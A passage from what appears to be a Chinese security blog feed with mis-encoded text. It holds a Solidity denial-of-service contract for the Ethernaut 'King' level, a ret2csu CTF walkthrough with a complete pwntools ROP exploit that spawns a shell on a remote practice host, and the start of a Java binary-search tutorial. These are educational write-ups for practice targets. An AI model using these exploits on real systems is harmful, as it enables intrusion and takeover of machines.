<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract KingAttack &#123;</span><br><span class="line"></span><br><span class="line">  	constructor(address payable  contract_addr) payable &#123;</span><br><span class="line">          contract_addr.call&#123;value:0.001 ether&#125;(&quot;&quot;);</span><br><span class="line">  	&#125;</span><br><span class="line">    fallback()payable external&#123;</span><br><span class="line">    &#x2F;&#x2F; è§¦å‘å¼‚å¸¸ï¼Œé˜»æ­¢Kingåˆçº¦çš„19ã€20è¡Œçš„æ‰§è¡Œ</span><br><span class="line">    	revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬è¦å…ˆå°†æˆ‘ä»¬çš„<code>KingAttack</code>åˆçº¦éƒ¨ç½²ï¼Œéƒ¨ç½²çš„æ—¶å€™åŒæ—¶è½¬å…¥<code>0.001 ether</code>(å› ä¸ºKingåˆçº¦ä¸­çš„<code>prize</code>ä¸º<code>0.001ether</code>)ã€‚éƒ¨ç½²å®Œæ¯•åï¼Œè¾“å…¥<code>await contract._king()</code>ï¼Œå¦‚æœè¿”å›çš„æ˜¯æˆ‘ä»¬<code>KingAttack</code>çš„åœ°å€ï¼Œåˆ™è¯´æ˜æˆ‘ä»¬è·å¾—äº†ç‹æƒï¼Œæ­¤æ—¶ç›´æ¥æäº¤å®ä¾‹å³å¯ã€‚</p>
]]></content>
      <categories>
        <category>ç½‘ç»œæ”»é˜²</category>
      </categories>
      <tags>
        <tag>Solidity</tag>
        <tag>Web3.0</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆè¯†ret2csu</title>
    <url>/2022/10/16/pwn%E8%8E%B7%E5%8F%96shell%E6%96%B9%E5%BC%8F%E4%B9%8B%E4%B8%80%E2%80%94%E2%80%94syscall/</url>
    <content><![CDATA[<p>åœ¨ 64 ä½ç¨‹åºä¸­ï¼Œå‡½æ•°çš„å‰ 6 ä¸ªå‚æ•°æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ é€’çš„ï¼Œä½†æ˜¯å¤§å¤šæ•°æ—¶å€™ï¼Œæˆ‘ä»¬å¾ˆéš¾æ‰¾åˆ°æ¯ä¸€ä¸ªå¯„å­˜å™¨å¯¹åº”çš„ <code>gadgets</code>ï¼Œæ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬ä¸èƒ½å¤Ÿé€šè¿‡<code>pop</code>çš„æ–¹å¼ç›´æ¥ä¿®æ”¹æ‰€éœ€è¦çš„å¯„å­˜å™¨ï¼Œ è¿™æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <code>x64</code> ä¸‹çš„<code>__libc_csu_init</code>ä¸­çš„ <code>gadgets</code>ã€‚è¿™ä¸ªå‡½æ•°æ˜¯ç”¨æ¥å¯¹<code>libc</code> è¿›è¡Œåˆå§‹åŒ–æ“ä½œçš„ï¼Œåœ¨è¿™é‡Œè¾¹ï¼Œä¼šå¯¹å¾ˆå¤šå¯„å­˜å™¨åˆå§‹åŒ–ï¼Œè€Œä¸€èˆ¬çš„ç¨‹åºéƒ½ä¼šè°ƒç”¨ <code>libc</code> å‡½æ•°ï¼Œæ‰€ä»¥è¿™ä¸ªå‡½æ•°ä¸€å®šä¼šå­˜åœ¨ã€‚</p>
<p>æˆ‘ä»¬ä»¥ä¸€é“é¢˜ç›®ä¸ºä¾‹ï¼š<a href="https://buuoj.cn/challenges#ciscn_2019_s_3" target="_blank" rel="noopener">ã€ciscn_2019_s_3ã€‘</a></p>
<a id="more"></a>

<h2 id="è·å–é¢˜ç›®åŸºç¡€ä¿¡æ¯"><a href="#è·å–é¢˜ç›®åŸºç¡€ä¿¡æ¯" class="headerlink" title="è·å–é¢˜ç›®åŸºç¡€ä¿¡æ¯"></a>è·å–é¢˜ç›®åŸºç¡€ä¿¡æ¯</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file ciscn_s_3</span></span><br><span class="line">ciscn_s_3: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=af580816080db5e4d1d93a271087adaee29028e8, not stripped</span><br></pre></td></tr></table></figure>

<p>64ä½å°ç«¯ç¨‹åºï¼Œå¾ˆå¸¸è§„</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols      FORTIFY  Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   68 Symbols     No     0</span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰<code>canary</code>ï¼Œè¯´æ˜å¦‚æœæœ‰æ ˆæº¢å‡ºæ¼æ´ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ï¼Œå¦å¤–<code>NX</code>ä¹Ÿå¼€å¯äº†ï¼Œè¯´æ˜æ ˆä¸Šä¸å¯æ‰§è¡Œã€‚å¸¸è§„å¾—ä¸èƒ½å†å¸¸è§„äº†ã€‚</p>
<h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>ä½¿ç”¨IDAåˆ†æï¼Œé‡è¦å‡½æ•°<code>vuln</code>å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">xor     rax, rax</span><br><span class="line">mov     edx, 400h       ; count</span><br><span class="line">lea     rsi, [rsp+buf]  ; buf</span><br><span class="line">mov     rdi, rax        ; fd</span><br><span class="line">syscall                 ; LINUX - sys_read</span><br><span class="line">mov     rax, 1</span><br><span class="line">mov     edx, 30h        ; count</span><br><span class="line">lea     rsi, [rsp+buf]  ; buf</span><br><span class="line">mov     rdi, rax        ; fd</span><br><span class="line">syscall                 ; LINUX - sys_write</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>

<p>å®é™…ä¸Šå°±æ˜¯é€šè¿‡ç³»ç»Ÿè°ƒç”¨çš„æ–¹å¼è°ƒç”¨äº†<code>read()</code>å’Œ<code>write()</code>å‡½æ•°ï¼Œå…·ä½“ä¸ºæœ€å¤šå†™è¿›<code>0x400h</code>ä¸ªæ•°æ®ï¼Œç„¶åå†è¾“å‡ºä»<code>buf</code>å¼€å§‹çš„ä½ç½®çš„<code>0x30h</code>ä¸ªæ•°æ®ã€‚</p>
<p>è€Œæˆ‘ä»¬çš„<code>buf</code>é•¿åº¦ä¸º<code>0x10</code>ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´å¹²ç‚¹äº‹æƒ…ã€‚</p>
<p>åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆçœ‹çœ‹ç³»ç»Ÿè°ƒç”¨çš„ä¸€äº›çŸ¥è¯†ã€‚</p>
<h3 id="ç³»ç»Ÿè°ƒç”¨"><a href="#ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨"></a>ç³»ç»Ÿè°ƒç”¨</h3><p>32ä½å’Œ64ä½ç³»ç»Ÿè°ƒç”¨æœ‰ä¸€äº›åŒºåˆ«ï¼Œå…·ä½“ä¸ºï¼š</p>
<p>32ä½ä¸64ä½ ç³»ç»Ÿè°ƒç”¨çš„åŒºåˆ«ï¼š</p>
<ol>
<li><p>ä¼ å‚æ–¹å¼ä¸åŒ</p>
</li>
<li><p>ç³»ç»Ÿè°ƒç”¨å·ä¸åŒ</p>
</li>
<li><p>è°ƒç”¨æ–¹å¼ ä¸åŒ</p>
</li>
</ol>
<table>
<thead>
<tr>
<th></th>
<th>32ä½</th>
<th>64ä½</th>
</tr>
</thead>
<tbody><tr>
<td>ä¼ å‚æ–¹å¼</td>
<td>å…ˆå°†ç³»ç»Ÿè°ƒç”¨å·ä¼ å…¥ eaxï¼Œç„¶åå°†å‚æ•°ä»å·¦åˆ°å³ä¾æ¬¡å­˜å…¥ ebxï¼Œecxï¼Œedxå¯„å­˜å™¨ä¸­ï¼Œè¿”å›å€¼å­˜åœ¨eaxå¯„å­˜å™¨</td>
<td>é¦–å…ˆå°†ç³»ç»Ÿè°ƒç”¨å· ä¼ å…¥ raxï¼Œç„¶åå°†å‚æ•° ä»å·¦åˆ°å³ ä¾æ¬¡å­˜å…¥ rdiï¼Œrsiï¼Œrdxå¯„å­˜å™¨ä¸­ï¼Œè¿”å›å€¼å­˜åœ¨raxå¯„å­˜å™¨</td>
</tr>
<tr>
<td>å¸¸è§ç³»ç»Ÿè°ƒç”¨å·</td>
<td>sys_read çš„è°ƒç”¨å· ä¸º 3<br>sys_write çš„è°ƒç”¨å· ä¸º 4</td>
<td>sys_read çš„è°ƒç”¨å· ä¸º 0<br>sys_write çš„è°ƒç”¨å· ä¸º 1<br>stub_execve çš„è°ƒç”¨å· ä¸º 59<br>stub_rt_sigreturn çš„è°ƒç”¨å· ä¸º 15</td>
</tr>
<tr>
<td>è°ƒç”¨æ–¹å¼</td>
<td>ä½¿ç”¨ int 80h ä¸­æ–­è¿›è¡Œç³»ç»Ÿè°ƒç”¨</td>
<td>ä½¿ç”¨ syscall æŒ‡ä»¤è¿›è¡Œç³»ç»Ÿè°ƒç”¨</td>
</tr>
</tbody></table>
<blockquote>
<p>å…¶ä»–ç³»ç»Ÿè°ƒç”¨å·å¯ä»¥å‚ç…§æ–‡ä»¶<code>/usr/include/asm/unistd.h</code></p>
</blockquote>
<h2 id="æº¢å‡ºæ¼æ´åˆ©ç”¨"><a href="#æº¢å‡ºæ¼æ´åˆ©ç”¨" class="headerlink" title="æº¢å‡ºæ¼æ´åˆ©ç”¨"></a>æº¢å‡ºæ¼æ´åˆ©ç”¨</h2><p>ç¡®å®šå…¶èƒ½å¤Ÿæº¢å‡ºä»¥åï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•åˆ©ç”¨æº¢å‡ºï¼Œæ§åˆ¶ç¨‹åºçš„èµ°å‘ï¼Œå³æ„é€ <code>execv(&#39;/bin/sh&#39;,0,0)</code>ï¼Œå†é€šè¿‡<code>syscall</code>æ‰§è¡Œ<code>execv</code>ï¼Œä»è€Œè·å–<code>shell</code>ï¼Œæ ˆå¤§è‡´å¸ƒå±€å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rax&#x3D;59</span><br><span class="line">rdi&#x3D;&#39;&#x2F;bin&#x2F;sh&#39;</span><br><span class="line">rsi&#x3D;0</span><br><span class="line">rdx&#x3D;0</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æˆ‘ä»¬å¹¶æ²¡æœ‰ä¸Šè¿°è¿ç»­çš„ç‰‡æ®µå¯ä»¥åˆ©ç”¨ï¼Œåªèƒ½å€ŸåŠ©å‡ ä¸ªç‰‡æ®µæ¥è¿›è¡Œã€‚</p>
<p>åŒæ—¶æˆ‘ä»¬è¿˜è¦è·å–<code>&#39;/bin/sh&#39;</code>çš„åœ°å€ï¼Œå¯æ˜¯æˆ‘ä»¬åœ¨<code>IDA</code>ä¸­ï¼Œå¹¶æ²¡æœ‰å‘ç°æ­¤å­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯è¯´è¦æˆ‘ä»¬æ‰‹åŠ¨æ„é€ ï¼Œæ„é€ å€’ä¹Ÿä¸æ˜¯éš¾äº‹ï¼Œä¸»è¦æ˜¯å¦‚ä½•æ‰¾åˆ°è¯¥å­—ç¬¦ä¸²åœ°å€ï¼Ÿ</p>
<p>æˆ‘ä»¬åœ¨æ­¤å›é¡¾ä¹‹å‰çš„<code>vuln</code>å‡½æ•°ï¼Œæˆ‘ä»¬ä¼šå‘ç°ï¼Œè¯¥å‡½æ•°ä¸­ä¼šå‡ºè¾“å‡ºä»<code>buf</code>å¼€å§‹çš„<code>0x30h</code>çš„æ•°æ®ï¼Œè€Œåˆšåˆšè¿›å…¥è¯¥å‡½æ•°çš„æ—¶å€™ï¼Œæ ˆå†…çš„å¤§è‡´å¸ƒå±€å¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># ä½åœ°å€</span><br><span class="line">buf </span><br><span class="line">...</span><br><span class="line">buf</span><br><span class="line">main_rbp</span><br><span class="line">main_retn_addr</span><br><span class="line">main&#39;s father function rbp</span><br><span class="line">main&#39;s father function retn_addr</span><br><span class="line">....</span><br><span class="line"># é«˜åœ°å€</span><br></pre></td></tr></table></figure>

<p>è™½ç„¶æ ˆåœ°å€æ¯æ¬¡éƒ½ä¼šæ”¹å˜ï¼Œä½†æ˜¯è¿›å…¥å‡½æ•°åï¼Œ<code>buf</code>çš„åœ°å€å’Œ<code>main_retn_addr</code>ä¹‹é—´çš„åç§»æ˜¯ä¸å˜çš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å€ŸåŠ©<code>write</code>å‡½æ•°æ³„éœ²çš„åœ°å€æ¥ç¡®å®š<code>buf</code>çš„åœ°å€ï¼Œè¿›ä¸€æ­¥åœ°ï¼Œå¦‚æœæˆ‘ä»¬åœ¨<code>buf</code>ä¸­å†™å…¥<code>&#39;/bin/sh&#39;</code>,é‚£è¯¥å­—ç¬¦ä¸²çš„åœ°å€æˆ‘ä»¬ä¹Ÿå°±å¾—åˆ°äº†ã€‚</p>
<p>è·å–åˆ°åœ°å€åï¼Œæˆ‘ä»¬è¦ç»§ç»­å›åˆ°<code>vuln</code>å‡½æ•°ä¸­ï¼Œç»§ç»­åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´ï¼Œå³æ„é€ <code>execv</code>çš„æ‰§è¡Œã€‚</p>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨<code>vuln</code>å‡½æ•°ä¸­ï¼Œå¹¶æ²¡æœ‰æ¢å¤æ ˆå¹³è¡¡ï¼Œåœ¨<code>buf</code>ä¸‹é¢ç›´æ¥æ˜¯è¿”å›åœ°å€ï¼Œå› ä¸ºç¨‹åºä¸­ï¼Œ==åœ¨<code>retn</code>æŒ‡ä»¤ä¹‹å‰å¹¶æ²¡æœ‰<code>leave</code>æŒ‡ä»¤==.</p>
<p>ä¸‹ä¸€æ­¥ï¼Œæˆ‘ä»¬å†åŠ¨æ€è°ƒè¯•ï¼Œçœ‹ä¸€ä¸‹ä¹‹å‰è¯´çš„åç§»æ˜¯å¤šå°‘ï¼Œæˆ‘ä»¬å…ˆè¿è¡Œåˆ°ç¬¬ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ä¹‹å‰ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">   0x4004ee &lt;vuln+1&gt;     mov    rbp, rsp</span><br><span class="line">   0x4004f1 &lt;vuln+4&gt;     xor    rax, rax</span><br><span class="line">   0x4004f4 &lt;vuln+7&gt;     mov    edx, 0x400</span><br><span class="line">   0x4004f9 &lt;vuln+12&gt;    lea    rsi, [rsp - 0x10]</span><br><span class="line">   0x4004fe &lt;vuln+17&gt;    mov    rdi, rax</span><br><span class="line"> â–º 0x400501 &lt;vuln+20&gt;    syscall  &lt;SYS_read&gt;</span><br><span class="line">        fd: 0x0 (&#x2F;dev&#x2F;pts&#x2F;0)</span><br><span class="line">        buf: 0x7fffffffde60 â—‚â€” 0x0</span><br><span class="line">        nbytes: 0x400</span><br><span class="line">   0x400503 &lt;vuln+22&gt;    mov    rax, 1</span><br><span class="line">   0x40050a &lt;vuln+29&gt;    mov    edx, 0x30</span><br><span class="line">   0x40050f &lt;vuln+34&gt;    lea    rsi, [rsp - 0x10]</span><br><span class="line">   0x400514 &lt;vuln+39&gt;    mov    rdi, rax</span><br><span class="line">   0x400517 &lt;vuln+42&gt;    syscall </span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">00:0000â”‚ rbp rsp 0x7fffffffde70 â€”â–¸ 0x7fffffffde90 â—‚â€” 0x1</span><br><span class="line">01:0008â”‚         0x7fffffffde78 â€”â–¸ 0x400536 (main+25) â—‚â€” nop    </span><br><span class="line">02:0010â”‚         0x7fffffffde80 â€”â–¸ 0x7fffffffdfa8 â€”â–¸ 0x7fffffffe2f8 â—‚â€” &#39;&#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;my_share&#x2F;chanllenge&#x2F;ciscn_2019_s_3&#x2F;ciscn_s_3&#39;</span><br><span class="line">03:0018â”‚         0x7fffffffde88 â—‚â€” 0x100000000</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å½“å‰æ ˆåº•æŒ‡é’ˆä¸º<code>rbp=0x7fffffffde70</code>ï¼Œæˆ‘ä»¬å‘ç°åœ¨ä¸»å‡½æ•°ä¸­ï¼Œè°ƒç”¨vulnçš„ä¸‹ä¸€è¡Œä»£ç çš„åœ°å€æ˜¯<code>0x400536</code>ï¼Œå¹¶ä¸æ˜¯ä»¥<code>0x7f</code>å¼€å¤´çš„ï¼Œä¸æ–¹ä¾¿è®¡ç®—åç§»ï¼Œå› æ­¤æˆ‘ä»¬ä½¿ç”¨<code>0x7fffffffde80</code>æŒ‡å‘çš„å†…å­˜ä¸­çš„å†…å®¹<code>0x7fffffffdfa8</code>è®¡ç®—åç§»åœ°å€ï¼Œç„¶åç»§ç»­è¿è¡Œï¼Œè¾“å…¥<code>aaaabbba</code>ï¼Œç„¶åæŸ¥æ‰¾è¯¥å­—ç¬¦ä¸²ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; search aaaabbba</span><br><span class="line">Searching for value: &#39;aaaabbba&#39;</span><br><span class="line">[stack]         0x7fffffffde60 &#39;aaaabbba\n&#39;</span><br></pre></td></tr></table></figure>

<p>æœ‰<code>0x7fffffffdfa8-0x7fffffffde60=0x148</code></p>
<p>å› æ­¤è·å–çš„å­—ç¬¦ä¸²åœ°å€çš„ä»£ç ä¸ºï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vuln_addr = <span class="number">0x0004004ED</span></span><br><span class="line">payload = flat([<span class="string">b'/bin/sh\0'</span> * <span class="number">2</span>, vuln_addr])</span><br><span class="line"></span><br><span class="line">hacker.sendline(payload)</span><br><span class="line"></span><br><span class="line">hacker.recv(<span class="number">0x20</span>)</span><br><span class="line">rbp = u64(hacker.recv(<span class="number">8</span>))</span><br><span class="line">bin_sh_addr = rbp - <span class="number">0x148</span></span><br></pre></td></tr></table></figure>

<p>æ‰¾åˆ°äº†å­—ç¬¦ä¸²åï¼Œæˆ‘ä»¬å†æ¥å›é¡¾ä¸€ä¸‹è¦åšçš„äº‹æƒ…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rax â† 59</span><br><span class="line">rdi â† &#x2F;bin&#x2F;sh</span><br><span class="line">rsi â† 0</span><br><span class="line">rdx â† 0</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p><strong>æ³¨æ„ï¼š</strong>1-4è¡Œçš„é¡ºåºå¯å˜ï¼Œåªè¦ä¿è¯æ‰§è¡Œ<code>syscall</code>çš„æ—¶å€™ï¼Œå…¶å¯¹åº”çš„å¯„å­˜å™¨ä¸­çš„å€¼æ˜¯ä¸Šè¿°æè¿°çš„å³å¯ã€‚</p>
<p>é€šè¿‡ä¸‹é¢çš„ä¸¤ä¸ªå‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°æ§åˆ¶ä¸Šè¿°çš„æŒ‡ä»¤ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ROPgadget --binary ciscn_s_3  --only <span class="string">'pop|ret'</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ROPgadget --binary ciscn_s_3  --only <span class="string">'mov|ret'</span></span></span><br></pre></td></tr></table></figure>

<p>ç„¶åæˆ‘ä»¬å´æ— æ³•æ‰¾åˆ°ç›´æ¥ä¿®æ”¹<code>rdx</code>çš„åœ°æ–¹ã€‚</p>
<p>ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æŸ¥æ‰¾ä¿®æ”¹è¯¥å¯„å­˜å™¨çš„åœ°æ–¹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> objdump ciscn_s_3 --disassemble  -M intel | grep rdx</span></span><br><span class="line">400580: mov    rdx,r13</span><br></pre></td></tr></table></figure>

<p>ç»§ç»­ä½¿ç”¨å‘½ä»¤è§‚å¯Ÿ<code>0x400580</code>åé¢çš„æŒ‡ä»¤ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400580: mov    rdx,r13</span><br><span class="line">400583: mov    rsi,r14</span><br><span class="line">400586: mov    edi,r15d</span><br><span class="line">400589: call   QWORD PTR [r12+rbx*8]</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿˜æ˜¯èƒ½ä¿®æ”¹å®Œï¼Œç„¶åè·³è½¬çš„ï¼åªè¦åœ¨è¿™é‡Œè¾¹å°†<code>r12</code>è®¾ç½®ä¸ºè¿”å›çš„åœ°å€ï¼Œ<code>rbx</code>è®¾ç½®ä¸º0ã€‚</p>
<p>æœ€ç»ˆåˆ©ç”¨é“¾å¦‚ä¸‹å›¾ï¼š</p>
<p><img src="https://cdn.yalexin.top/ROPgadget.png" alt="ROPgadget"></p>
<p>å‰ä¸¤ä¸ª<code>gadgets</code>å°±æ˜¯åˆ©ç”¨äº†<code>ret2csu</code>çš„æ€æƒ³ã€‚</p>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œcallæœ€ç»ˆå®é™…è°ƒç”¨çš„åœ°æ–¹æ˜¯<code>[[r12+rbx*8]]</code>ï¼Œå‡å¦‚è¯´ï¼Œæˆ‘ä»¬çš„<code>mov rax, 0x3b</code>çš„åœ°å€æ˜¯<code>7</code>,ç„¶åæˆ‘ä»¬å°†è¯¥åœ°å€å†™å…¥åˆ°æ ˆä¸Šåœ°å€ä¸º<code>3</code>çš„åœ°æ–¹ï¼Œåˆ™æˆ‘ä»¬çš„<code>r12+rbx*8</code>çš„å€¼ä¸º<code>3</code>,å³</p>
<p><img src="https://cdn.yalexin.top/call.drawio.png" alt="call.drawio"></p>
<p>ç¬¬äºŒæ¬¡æº¢å‡ºåˆ©ç”¨ä»£ç ä¸ºï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b'/bin/sh\0'</span> * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rbx_rbp_r12_r13_r14_r15_ret_addr)</span><br><span class="line"><span class="comment"># bin_sh_addr + 0x50 æ˜¯ mov_rax_ret_addr æ‰€åœ¨åœ°å€</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(bin_sh_addr + <span class="number">0x50</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(mov_rdx_rsi_edi_call_addr)</span><br><span class="line">payload += p64(mov_rax_ret_addr) + p64(pop_rdi_ret)+p64(bin_sh_addr) + p64(syscall_addr)</span><br><span class="line"></span><br><span class="line">hacker.sendline(payload)</span><br></pre></td></tr></table></figure>

<h2 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher  <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>, os = <span class="string">'linux'</span>, arch = <span class="string">'amd64'</span>)</span><br><span class="line">debug = <span class="literal">False</span></span><br><span class="line">hacker = <span class="literal">None</span> </span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    hacker = process(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    hacker = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">26674</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x10</span></span><br><span class="line">elf = ELF(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x0004004ED</span></span><br><span class="line">payload = flat([<span class="string">b'/bin/sh\0'</span> * <span class="number">2</span>, vuln_addr])</span><br><span class="line"></span><br><span class="line">hacker.sendline(payload)</span><br><span class="line"></span><br><span class="line">hacker.recv(<span class="number">0x20</span>)</span><br><span class="line">rbp = u64(hacker.recv(<span class="number">8</span>))</span><br><span class="line">bin_sh_addr = rbp - <span class="number">0x118</span></span><br><span class="line"><span class="comment"># bin_sh_addr = rbp - 0x148</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15_ret_addr = <span class="number">0x40059A</span></span><br><span class="line">mov_rdx_rsi_edi_call_addr = <span class="number">0x400580</span></span><br><span class="line">mov_rax_ret_addr = <span class="number">0x4004e2</span></span><br><span class="line">pop_rsi_r15_ret_addr = <span class="number">0x4005a1</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4005a3</span></span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'/bin/sh\0'</span> * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rbx_rbp_r12_r13_r14_r15_ret_addr)</span><br><span class="line"><span class="comment"># bin_sh_addr + 0x50 æ˜¯ mov_rax_ret_addr æ‰€åœ¨åœ°å€</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(bin_sh_addr + <span class="number">0x50</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(mov_rdx_rsi_edi_call_addr)</span><br><span class="line">payload += p64(mov_rax_ret_addr) + p64(pop_rdi_ret)+p64(bin_sh_addr) + p64(syscall_addr)</span><br><span class="line"></span><br><span class="line">hacker.sendline(payload)</span><br><span class="line">hacker.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>ç„¶è€Œæœ¬é¢˜ä¸­ï¼Œå®˜æ–¹æä¾›çš„ç¨‹åºå’Œå®é™…è¿œç¨‹è¿è¡Œçš„ä¸ä¸€è‡´ï¼Œä½¿å¾—ä¹‹å‰è¯´çš„åç§»é‡å¹¶ä¸æ˜¯<code>0x148</code>.</strong></p>
]]></content>
  </entry>
  <entry>
    <title>äºŒåˆ†æŸ¥æ‰¾</title>
    <url>/2020/08/24/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/</url>
    <content><![CDATA[<p>äºŒåˆ†æŸ¥æ‰¾åº”ç”¨äºåœ¨æœ‰åºæ•°ç»„ä¸­å¯»æ‰¾æ»¡è¶³ç‰¹å®šæ¡ä»¶çš„å…ƒç´ ï¼Œæ—¶é—´å¤æ‚åº¦å¯ä»¥é™åˆ°<code>O(logn)</code>ï¼Œè¯¥ç®—æ³•çš„å¿…è¦å‰ææ˜¯æœ‰åºæ•°ç»„å¿…é¡»æœ‰åºã€‚<a id="more"></a></p>
<h2 id="æŸ¥æ‰¾ä¸å°äºtargetå…ƒç´ çš„ä¸‹æ ‡"><a href="#æŸ¥æ‰¾ä¸å°äºtargetå…ƒç´ çš„ä¸‹æ ‡" class="headerlink" title="æŸ¥æ‰¾ä¸å°äºtargetå…ƒç´ çš„ä¸‹æ ‡"></a>æŸ¥æ‰¾ä¸å°äºtargetå…ƒç´ çš„ä¸‹æ ‡</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lower_bound</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> start, <span class="keyword">int</span> end, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">        mid = (start + end) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (target &gt; nums[mid]) &#123;</span><br><span class="line">            start = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            end = mid;</span><br><span class="line">        